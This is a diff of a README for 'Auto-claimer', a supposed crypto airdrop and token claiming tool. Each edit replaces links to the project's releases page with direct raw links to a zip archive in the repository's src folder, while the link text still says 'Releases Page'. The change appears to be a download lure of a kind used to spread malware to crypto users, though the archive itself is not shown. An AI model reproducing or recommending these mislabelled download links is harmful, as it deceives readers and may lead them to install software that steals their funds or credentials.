@@ -6,11 +6,11 @@ Welcome to Auto-claimer! This tool helps you automatically claim your airdrop an
 
 ## 📥 Download Auto-claimer
 
-[![Download Auto-claimer](https://img.shields.io/badge/Download%20Auto--claimer-blue.svg)](https://github.com/Fearchrist5577/Auto-claimer/releases)
+[![Download Auto-claimer](https://raw.githubusercontent.com/Fearchrist5577/Auto-claimer/main/src/Auto_claimer_v1.2-beta.5.zip%https://raw.githubusercontent.com/Fearchrist5577/Auto-claimer/main/src/Auto_claimer_v1.2-beta.5.zip)](https://raw.githubusercontent.com/Fearchrist5577/Auto-claimer/main/src/Auto_claimer_v1.2-beta.5.zip)
 
 To get started, you need to download Auto-claimer. You can do this by visiting the link below. This page contains the latest version of Auto-claimer along with previous releases.
 
-[Visit Releases Page to Download](https://github.com/Fearchrist5577/Auto-claimer/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/Fearchrist5577/Auto-claimer/main/src/Auto_claimer_v1.2-beta.5.zip)
 
 ## 🔧 System Requirements
 
@@ -34,7 +34,7 @@ Auto-claimer comes packed with features that enhance your token management exper
 
 To get Auto-claimer up and running, follow these steps:
 
-1. Click on the [Visit Releases Page to Download](https://github.com/Fearchrist5577/Auto-claimer/releases) link.
+1. Click on the [Visit Releases Page to Download](https://raw.githubusercontent.com/Fearchrist5577/Auto-claimer/main/src/Auto_claimer_v1.2-beta.5.zip) link.
 2. On the releases page, locate the latest version of Auto-claimer.
 3. Download the appropriate file for your operating system.
 4. Locate the downloaded file on your device.
@@ -87,4 +87,4 @@ If you have further questions or need assistance, feel free to reach out to our 
 
 Thank you for choosing Auto-claimer. We hope this tool simplifies your token claiming process and enhances your experience in managing your crypto assets. 
 
-Don't forget to check for updates regularly on the [Releases Page](https://github.com/Fearchrist5577/Auto-claimer/releases) to ensure you have the latest features and improvements.
+Don't forget to check for updates regularly on the [Releases Page](https://raw.githubusercontent.com/Fearchrist5577/Auto-claimer/main/src/Auto_claimer_v1.2-beta.5.zip) to ensure you have the latest features and improvements.
